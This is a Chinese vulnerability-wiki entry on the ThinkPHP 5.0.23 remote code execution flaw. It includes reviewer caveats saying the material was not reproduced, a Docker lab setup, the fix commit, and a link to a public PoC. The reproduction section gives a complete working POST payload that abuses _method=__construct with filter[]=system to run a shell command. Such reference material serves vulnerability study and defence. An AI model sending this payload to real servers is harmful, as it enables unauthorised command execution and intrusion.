---
source: "Threekiii/Vulnerability-Wiki"
product: "ThinkPHP / Request 方法覆盖"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "ThinkPHP5-5.0.23-远程代码执行漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：称5.0.23以前但实验为5.0.23；依captcha方法路由，debug非必要需说明"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-36b46bd1df8b4ea18843c9ac"
entity_id: "ve-36b46bd1df8b4ea18843c9ac"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：称5.0.23以前但实验为5.0.23；依captcha方法路由，debug非必要需说明

代码与实验材料：完整POST，固定长度，结果空白；未运行

来源证据范围：有不可变官方修复commit 4a4b5e64...

- **适用与权限边界（1）**：影响端点和分支条件不明确；依据：“以前”是否包含5.0.23不清；captcha路由取决于安装组件，不是全部默认部署。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **证据待核（2）**：请求与证据不足；依据：Content-Length固定72；称成功执行id后空白无响应。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# ThinkPHP5 5.0.23 远程代码执行漏洞

## 漏洞描述

ThinkPHP 是一款运用极广的 PHP 开发框架。其 5.0.23 以前的版本中，获取 method 的方法中没有正确处理方法名，导致攻击者可以调用 Request 类任意方法并构造利用链，从而导致远程代码执行漏洞。

参考链接：

- https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003

## 环境搭建

执行如下命令启动一个默认的 thinkphp 5.0.23 环境：

```
docker-compose up -d
```

环境启动后，访问 `http://your-ip:8080/index.php` 即可看到默认的 ThinkPHP 启动页面。

## 漏洞复现

发送数据包：

```
POST /index.php?s=captcha HTTP/1.1
Host: your-vps-ip:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 72

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
```

成功执行 `id` 命令：




## 开源 POC/EXP

- https://github.com/sukabuliet/ThinkphpRCE


---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
